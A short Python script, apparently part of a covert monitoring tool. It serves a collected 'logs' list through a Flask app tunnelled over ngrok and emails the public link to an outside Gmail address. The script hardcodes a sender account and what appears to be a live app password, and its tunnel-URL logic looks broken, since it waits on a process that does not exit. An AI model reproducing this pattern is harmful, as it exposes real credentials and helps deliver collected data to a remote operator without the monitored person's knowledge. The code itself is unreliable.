import subprocess
import smtplib
from email.mime.text import MIMEText
from flask import Flask, render_template
from flask_ngrok import run_with_ngrok
import threading

app = Flask(__name__)
run_with_ngrok(app)  # Start ngrok when app is run

logs = []

@app.route('/')
def home():
    return render_template('index.html', logs=logs)

def send_ngrok_url():
    ngrok_output = subprocess.check_output(['./ngrok', 'http', '5000']).decode('utf-8')
    ngrok_url = ngrok_output.split()[-1]

    from_email = "1nc0gn1t0.5pyd@gmail.com"
    to_email = "lucifer.gaming.1913@gmail.com"
    password = "dgbqjdxzybssamqv"

    msg = MIMEText(f"Access your Flask app at: {ngrok_url}")
    msg['Subject'] = 'Ngrok URL'
    msg['From'] = from_email
    msg['To'] = to_email

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_email, password)
    server.sendmail(from_email, to_email, msg.as_string())
    server.quit()

def run_flask():
    app.run(host='0.0.0.0', port=5000)

def update_logs(new_logs):
    global logs
    logs = new_logs

if __name__ == '__main__':
    t1 = threading.Thread(target=send_ngrok_url)
    t2 = threading.Thread(target=run_flask)

    t1.start()
    t2.start()
